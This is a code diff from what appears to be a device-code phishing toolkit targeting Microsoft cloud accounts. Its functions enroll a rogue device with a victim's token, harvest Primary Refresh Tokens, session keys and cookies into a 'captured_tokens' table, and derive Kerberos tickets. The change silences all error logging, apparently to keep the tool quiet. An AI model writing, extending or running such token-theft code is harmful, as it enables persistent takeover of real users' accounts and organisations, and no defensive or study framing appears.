@@ -189,7 +189,7 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
     const transportFailure = /ECONNRESET|ETIMEDOUT|ECONNREFUSED|EAI_AGAIN|socket hang up|tunneling socket/i
       .test(drsErr.message || '');
     if (!transportFailure) throw drsErr;
-    console.warn('[devicecode] DRS enrollment via proxy failed (' + drsErr.message + '); retrying direct');
+
     response = await ms.post(DRS_ENDPOINT, drsPayload, {
       headers: drsHeaders,
       timeout: 30000,
@@ -469,7 +469,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 deviceCertPemForPrt = deviceCertificate || null;
                 deviceId = enrollmentResult.deviceId || deviceId;
             } catch (enrollErr) {
-                console.error('[devicecode] Device enrollment failed:', enrollErr.message);
+
                 deviceEnrolled = false;
             }
         }
@@ -498,10 +498,10 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                         certificateDerBase64: certificateForPrt,
                     });
                 } catch (skErr) {
-                    console.warn('[devicecode] session key not stored in device_credentials:', skErr.message);
+
                 }
             } catch (prtErr) {
-                console.error('[devicecode] request_for_device failed:', prtErr.message);
+
             }
         }
         const storedPrt = rawPrt || xmsPrtCookie || null;
@@ -542,7 +542,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
         } catch (insertErr) {
           const msg = insertErr?.message || '';
           if (/Unknown column/i.test(msg)) {
-            console.warn('[devicecode] Device columns missing, falling back to legacy insert');
+
             const [legacyResult] = await db.query(
                 `INSERT INTO captured_tokens
                  (user_id, link_id, email, token_type, access_token_encrypted,
@@ -578,7 +578,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
             && tenant && tenant !== 'common' && tenant !== 'organizations') {
             const kerberosService = require('./kerberos');
             kerberosService.deriveTGTForToken(tokenId)
-                .catch(err => console.error('[devicecode] Kerberos derivation error:', err.message));
+                .catch(err => {});
         }
 
         return {
